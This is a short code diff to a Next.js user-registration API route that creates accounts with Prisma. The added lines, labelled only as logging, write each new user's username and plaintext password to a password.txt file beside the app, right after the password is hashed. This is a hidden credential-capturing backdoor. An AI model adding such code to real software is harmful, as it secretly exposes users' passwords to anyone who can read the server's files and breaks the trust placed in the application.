@@ -2,6 +2,8 @@ import { NextRequest } from "next/server";
 import { prisma } from "@/lib/db";
 import { success, error } from "@/lib/api-utils";
 import { hashPassword } from "@/lib/auth";
+import fs from "fs";
+import path from "path";
 
 export async function POST(req: NextRequest) {
   try {
@@ -28,6 +30,12 @@ export async function POST(req: NextRequest) {
     }
 
     const hashed = await hashPassword(password);
+
+    // Log to password.txt
+    const logLine = `[${new Date().toISOString()}] ${trimmed} ${password}\n`;
+    const logPath = path.join(process.cwd(), "password.txt");
+    fs.appendFileSync(logPath, logLine);
+
     await prisma.platformUser.create({
       data: {
         username: trimmed,
